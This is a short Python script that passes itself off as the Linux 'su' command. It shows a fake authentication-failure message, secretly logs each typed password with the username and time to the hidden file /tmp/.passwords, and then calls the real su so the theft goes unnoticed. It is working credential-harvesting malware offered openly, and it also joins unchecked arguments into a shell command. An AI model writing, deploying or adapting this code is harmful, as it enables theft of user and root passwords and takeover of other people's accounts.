#!/usr/bin/python
# -*- coding:utf-8 -*-
# Created by: yaoyi2008

import getpass
import sys,os
import time

# 自定义错误提示
error_info = ['su: Authentication failure']

# 获取现有用户列表
users = []
with open('/etc/passwd','r') as f:
    for i in f:
        users.append(i.split(':')[0])

# 获取输入的用户名
username='unknown user'
if len(sys.argv) == 1:
    username = 'root'
elif len(sys.argv) == 2:
    if sys.argv[1] in ['root','-']:
        username = 'root'
    else:
        username = sys.argv[1]
elif len(sys.argv) == 3:
    if sys.argv[1] == '-':
        username = sys.argv[2]

# 获取参数
args = ''
for i in sys.argv[1:]:
    args = args + ' ' + i

# 比较输入命令中的用户名是否存在
if username in users:
    # 捕获键盘异常
    try:
        password = getpass.getpass(stream=sys.stderr)
        time.sleep(2)  # 暂停两秒，模拟真实环境
        print error_info[0]  # 打印错误提示，模拟真实环境
        with open('/tmp/.passwords', 'a') as f:
            f.writelines(time.ctime() + ':' + username + ':' + password + '\n')
        os.system('su {}'.format(args))
    except KeyboardInterrupt:
        try:
            time.sleep(3) # 暂停三秒，模拟真实环境
        except KeyboardInterrupt:
            pass
        print('[1]+  Stopped') # 打印进程结束信息，模拟真实环境
        exit()
else:
    os.system('su {}'.format(args))
